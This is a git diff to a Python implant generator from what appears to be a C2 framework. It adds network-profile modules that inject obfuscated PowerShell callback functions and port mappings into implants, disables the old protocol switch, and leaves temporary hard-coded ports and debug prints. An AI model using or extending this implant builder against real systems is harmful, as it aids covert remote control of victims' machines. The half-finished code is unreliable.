@@ -5,6 +5,7 @@ import base64
 
 from Implant.PSObfucate import PSObfucate
 from Implant.ImplantFunctionality import ImplantFunctionality
+from NetworkProfiles.NetworkProfileManager import NetworkProfileManager
 
 
 class ImplantGenerator:
@@ -14,6 +15,7 @@ class ImplantGenerator:
     #   which functionality should be embedded within the active implant.
 
     ImpFunc = ImplantFunctionality()
+    NetProfMan = NetworkProfileManager()
 
     JinjaRandomisedArgs = {
         "obf_remote_play_audio": "RemotePlayAudio",
@@ -73,7 +75,7 @@ function {{ ron.obf_builtin_command }}($data){
     }
 }
 '''
-
+# TO BE REMOVED
     http_function = '''
 function {{ ron.obf_http_conn }}(${{ ron.obf_callback_reason }}){
     if ( ${{ ron.obf_callback_reason }} -eq $null ){
@@ -188,11 +190,41 @@ while($true){
         implant_functions = self.ImpFunc.get_list_of_implant_text()
         implant_functions.extend(core_implant_functions)
 
+
+
+        ports = {}
+        network_profile_functions = {}
+        # -- NEW NETWORK PROFILE CONTENT
+        for x in implant_data['network_profiles']:
+            #print("@@",x)
+            code, variables= self.NetProfMan.get_implant_powershell_code(x)
+
+            obf_variables = variables[0]
+            port_variables = variables[1]
+
+            # code is now in the base
+            implant_functions.append(code)
+            # Args are now in the base!
+            self.JinjaRandomisedArgs.update(obf_variables)
+            print(self.JinjaRandomisedArgs)
+            network_profile_functions.update(obf_variables)
+
+
+
+            for key in port_variables.keys():
+                port_variables[key] = implant_data['network_profiles'][x]
+            print(port_variables) #  =implant_data['network_profiles'][x]
+            print("@@",port_variables, implant_data['network_profiles'][x])
+            print("-----------------------------------------")
+            ports.update(port_variables)
+
+
+        print(f"final ports: {ports}")
         # Checks which protocols should be embedded into the implant.
-        if implant_data['comms_http'] is not None:
-            implant_functions.append(self.http_function)
-        if implant_data['comms_https'] is not None:
-            implant_functions.append(self.https_function)
+        # if implant_data['comms_http'] is not None:
+        #     implant_functions.append(self.http_function)
+        # if implant_data['comms_https'] is not None:
+        #     implant_functions.append(self.https_function)
         if implant_data['kill_date'] is not None:
             implant_functions.append(self.kill_date)
 
@@ -204,20 +236,35 @@ while($true){
 
         constructed_implant = self._manage_implant_function_order(implant_data, implant_functions)
 
-        # Generates the blob of code which will be used to determine which protocol should be selected from.
+
+        # DEV
         protocol_string = ""
         proto_count = 0
-        proto_list = {'comms_http': randomised_function_names['obf_http_conn'],
-                      'comms_https': randomised_function_names['obf_https_conn'],
-                      'comms_dns': randomised_function_names['obf_dns_conn']}
+        for net_prof in network_profile_functions.keys():
+            print(net_prof)
+            print(network_profile_functions[net_prof])
+            protocol_string += f"     {proto_count} {{ {network_profile_functions[net_prof]}($plh) }}\n"
+            proto_count += 1
 
-        for x in proto_list.keys():
-            if implant_data[x] is not 0:
-                protocol_string = protocol_string + "    " + str(proto_count) + " { " + proto_list[x] + "($plh) }\n"
-                proto_count += 1
 
-        f_str = 'switch ('+randomised_function_names['obf_select_protocol']+'('+str(proto_count)+') ){ \n'+protocol_string+' }'
-        return constructed_implant, f_str
+        f_str = 'switch (' + randomised_function_names['obf_select_protocol'] + '(' + str(
+            proto_count) + ') ){ \n' + protocol_string + ' }'
+        print(f_str)
+
+        # Generates the blob of code which will be used to determine which protocol should be selected from.
+        # protocol_string = ""
+        # proto_count = 0
+        # proto_list = {'comms_http': randomised_function_names['obf_http_conn'],
+        #               'comms_https': randomised_function_names['obf_https_conn'],
+        #               'comms_dns': randomised_function_names['obf_dns_conn']}
+        #
+        # for x in proto_list.keys():
+        #     if implant_data[x] is not 0:
+        #         protocol_string = protocol_string + "    " + str(proto_count) + " { " + proto_list[x] + "($plh) }\n"
+        #         proto_count += 1
+        #
+        # f_str = 'switch ('+randomised_function_names['obf_select_protocol']+'('+str(proto_count)+') ){ \n'+protocol_string+' }'
+        return constructed_implant, f_str, ports
 
     def generate_implant_from_template(self, implant_data):
         """
@@ -229,23 +276,26 @@ while($true){
          - Generates the main function multi proto selection
         """
         implant_function_names = self._function_name_obfuscation(implant_data, self.JinjaRandomisedArgs)
-        implant_template, protocol_switch = self._process_modules(implant_data, implant_function_names)
+        implant_template, protocol_switch, ports = self._process_modules(implant_data, implant_function_names)
 
         callback_url = implant_data['callback_url']
         variable_list = ""
         if implant_data['obfuscation_level'] >= 3:
             ps_ofb = PSObfucate()
             variable_list, callback_url = ps_ofb.variableObs(implant_data['callback_url'])
-
         cc = jinja2.Template(implant_template)
         print(implant_data['kill_date'])
         output_from_parsed_template = cc.render(
             initial_sleep=implant_data['initial_delay'],
             http=12345,
             url=callback_url,
-            http_port=implant_data['comms_http'],
-            https_port=implant_data['comms_https'],
-            dns_port=implant_data['comms_dns'],
+            # Temp
+            http_port=1234,
+            https_port=3456,
+            dns_port=6789,
+            ports=ports,
+            # netprof=netprof,
+            # end temp
             uii=implant_data['unique_implant_id'],
             stager_key=implant_data['stager_key'],
             ron=implant_function_names,
